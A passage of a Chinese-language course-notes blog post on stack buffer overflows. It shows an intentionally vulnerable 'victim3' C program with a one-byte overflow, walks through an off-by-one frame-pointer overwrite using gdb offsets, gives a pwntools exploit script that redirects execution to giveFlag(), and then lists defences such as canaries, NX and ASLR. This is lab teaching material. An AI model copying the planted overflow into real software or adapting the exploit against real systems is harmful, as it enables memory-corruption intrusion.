+<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">giveFlag</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>flagfile<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">perror</span><span class="token punctuation">(</span>flagfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[√] Your flag: %s\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">hear</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">char</span> str<span class="token punctuation">[</span>LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">handle_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] Hi, Give me something to overflow me!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> secret<span class="token punctuation">[</span>LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> LENGTH<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">hear</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">handle_connection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="过程-3">过程</h4>
+<p>栈内存布局为：</p>
+<p><img src="/2020/07/18/SoftwareSecurity1/1720260083575.png" alt="" width="500"></p>
+<p>这题只有一个字节的溢出空间，可以修改handle_connection和hear两者frame内的ebp地址的最低位字节。</p>
+<p>思路是这样的：handle_connection()中读入257个字符，进入hear()后，str所在的buffer读入了这257个字符，hear()的frame部分的ebp的最低位被修改。为了保证hear()中的strcpy()能够顺利执行，我们输入的第257位字符一定要是终结符。这样程序才不会发生错误。</p>
+<p>当hear()执行完返回时(即执行leave指令的第二步pop $ebp)，这个错误的old ebp会被pop给$ebp。回到handle_connection()的frame，handle_connection()执行完毕返回时(即执行leave指令的第一步mov $ebp, $esp)，栈指针esp会指向这个错误的ebp位置，然后执行ret指令时也会pop错误的return address。我们的目标就是让程序能够在这一步跳到giveFlag()函数。</p>
+<p>由于第257位字符是终结符0，这代表old ebp的最低位字节的地址被修改为'\x00'（在C中，'\0'='\x00'），那么被修改后的old ebp一定小于原先的old ebp。也就是说执行完handle_connection()的leave的第一步后，esp的位置应该在secret处(因为secret有256个字节长，基本可以确定范围)。可以在payload中加入giveFlag()的地址*n，只要被修改的ebp指向其中的任意一个giveFlag()地址开头，那么一定会pop地址给PC，进而执行giveFlag()。</p>
+<p>所以我们保证修改后的ebp指向giveFlag()地址开头即可，先假设payload=addr32(giveFlag)*64，要计算一个偏移量来构造payload。</p>
+<p>gdb打断点看一下函数执行到handle_connection()域时的ebp和esp的值：</p>
+<p><img src="/2020/07/18/SoftwareSecurity1/1720266021011.png" alt="" width="700"></p>
+<p>$ebp = 0xffffcb4c，$esp = 0xffffca4c，那么修改后的$ebp=0xffffcb00。0xcb00-0xca4c=180为4的倍数。所以修改后的ebp能刚好指向giveFlag()的开头，所以偏移量=0。</p>
+<p>进而可以构造payload。</p>
+<p>即使开启了ASLR，但偏移量总有可能是0，所以也不需要修改，多attack几次就能拿到flag。</p>
+<p>在本地的结果：</p>
+<p><img src="/2020/07/18/SoftwareSecurity1/1720266041103.png" alt=""></p>
+<h4 id="攻击脚本-3">攻击脚本</h4>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./victim3'</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x080486a6</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">64</span><span class="token operator">+</span><span class="token string">'\0'</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="防御手段">防御手段</h2>
+<h3 id="Canary">Canary</h3>
+<p>在ebp下面放一个字作为canary,在程序调用结束之前(leave ret之前), 检查栈上的canary与寄存器中的canary是否相等，若不相等则调用中断程序。</p>
+<p>攻击方式：printf格式化字符串漏洞攻击拉出canary。</p>
+<h3 id="DEP-NX">DEP(NX)</h3>
+<p>指定内存要么为RX(可读可执行)，要么为RW(可读可写)。</p>
+<p>攻击方式：Code reuse attack, e.g., ret2libc</p>
+<h3 id="ASLR">ASLR</h3>
+<p>Address Space Layout Randomization(ASLR),地址空间布局随机化,每次程序运行时，其分布不完全固定而是随机的，那么我们无法确定return address，从而难以攻击。ASLR只打乱Stack区和lib，其他的如Heap和Text区并不会被打乱。</p>
+<p>攻击方式：brute force，ret2ret，ret2pop，ret2esp之类的</p>
+<h2 id="参考资料">参考资料</h2>
+<p>[1] 老师课件02<br>
+[2] https://www.jianshu.com/p/4c0a30e7ddd2</p>
+</div>
+  <!--评论块-->
+  
+</article>
+<nav class="post-nav">
+  <!-- Prev Nav -->
+  
+  <a href="/2020/07/22/SoftwareSecurity2/" id="post_nav-newer" class="post-nav-content prev-content"> Prev: 《Software Security Note(2) | ROP》 </a>
+  
+
+  <!-- Next Nav -->
+  
+  <a href="/2020/02/15/ygo/" id="post_nav-older" class="post-nav-content next-content"> Next: 《一飞冲天啊，我！》 </a>
+  
+</nav>
+<div class="post-toc-btn"><i class="material-icons">format_list_numbered</i></div>
+<div class="post-toc-none"><p>(无)</p></div>
+<div class="post-toc-box"><ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="post-toc-number">1.</span> <span class="post-toc-text">概念</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%8E%86%E5%8F%B2%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9BBuffer-Overflow%E6%94%BB%E5%87%BB"><span class="post-toc-number">2.</span> <span class="post-toc-text">历史上的一些Buffer Overflow攻击</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Morris%E8%A0%95%E8%99%AB"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">Morris蠕虫</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Heartbleed%E6%BC%8F%E6%B4%9E"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">Heartbleed漏洞</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="post-toc-number">3.</span> <span class="post-toc-text">基础知识</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">程序内存布局</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%A0%88%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">栈内存布局</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Frame-Pointer%E5%B8%A7%E6%8C%87%E9%92%88"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">Frame Pointer帧指针</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Stack-Pointer%E6%A0%88%E6%8C%87%E9%92%88"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">Stack Pointer栈指针</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">汇编指令</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#call%E6%8C%87%E4%BB%A4"><span class="post-toc-number">3.5.1.</span> <span class="post-toc-text">call指令</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#leave%E6%8C%87%E4%BB%A4"><span class="post-toc-number">3.5.2.</span> <span class="post-toc-text">leave指令</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#ret%E6%8C%87%E4%BB%A4"><span class="post-toc-number">3.5.3.</span> <span class="post-toc-text">ret指令</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="post-toc-number">4.</span> <span class="post-toc-text">攻击原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B"><span class="post-toc-number">5.</span> <span class="post-toc-text">攻击示例</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Victim1"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">Victim1</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="post-toc-number">5.1.1.</span> <span class="post-toc-text">源代码</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="post-toc-number">5.1.2.</span> <span class="post-toc-text">过程</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC"><span class="post-toc-number">5.1.3.</span> <span class="post-toc-text">攻击脚本</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Victim2"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">Victim2</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-2"><span class="post-toc-number">5.2.1.</span> <span class="post-toc-text">源代码</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E8%BF%87%E7%A8%8B-2"><span class="post-toc-number">5.2.2.</span> <span class="post-toc-text">过程</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC-2"><span class="post-toc-number">5.2.3.</span> <span class="post-toc-text">攻击脚本</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Victim3"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">Victim3</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-3"><span class="post-toc-number">5.3.1.</span> <span class="post-toc-text">源代码</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E8%BF%87%E7%A8%8B-3"><span class="post-toc-number">5.3.2.</span> <span class="post-toc-text">过程</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC-3"><span class="post-toc-number">5.3.3.</span> <span class="post-toc-text">攻击脚本</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5"><span class="post-toc-number">6.</span> <span class="post-toc-text">防御手段</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Canary"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">Canary</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#DEP-NX"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">DEP(NX)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ASLR"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">ASLR</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="post-toc-number">7.</span> <span class="post-toc-text">参考资料</span></a></li></ol></div>
+<!--<div class="post-back"><i class="material-icons">arrow_back</i></div>-->
+<script type="text/javascript">
+  menu();
+</script>
+</div>
+    </div>
+    <div id="bottom-outer">
+      <div id="bottom-inner"><a id="top-button" onfocus="this.blur();"
+  ><div class="up upinbody" style="background-color: #DDDDDD"><i class="material-icons material-up">vertical_align_top</i></div></a
+>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+ 
+
+
+<p style="line-height: 45px">Copyright © 2017-2024 Antirain</p>
+<p style="line-height: 45px">Powered by <a href="https://hexo.io/" target="_blank"> Hexo </a> && Theme - <a href="https://github.com/moumao/hexo-theme-Vateral" target="_blank">Vateral</a></p>
+
+</div>
+    </div>
+
+    <!--影集界面需要的资源-->
+     
+    <!-- scripts list from theme config.yml -->
+    
+    <script src="/js/jquery-3.1.1.min.js"></script>
+    
+    <script src="/js/materialize.min.js"></script>
+    
+    <script src="/js/main.min.js"></script>
+    
+    <script src="/js/prism.js"></script>
+     
+    <script>
+      NProgress.start();
+      NProgress.done();
+      lazy();
+      links();
+      window.onpopstate = menu();
+      //pjax操作
+      $(document).pjax("a:not(.nopjax)", "#content-inner", { fragment: "#content-inner", timeout: 8000 });
+      $(document)
+        .on("pjax:start", NProgress.start)
+        .on("pjax:end", NProgress.done)
+        .on("pjax:end", () => {
+          dowmdiv();
+          lazy();
+          toc();
+          links();
+          menu();
+        });
+    </script>
+  </body>
+</html>
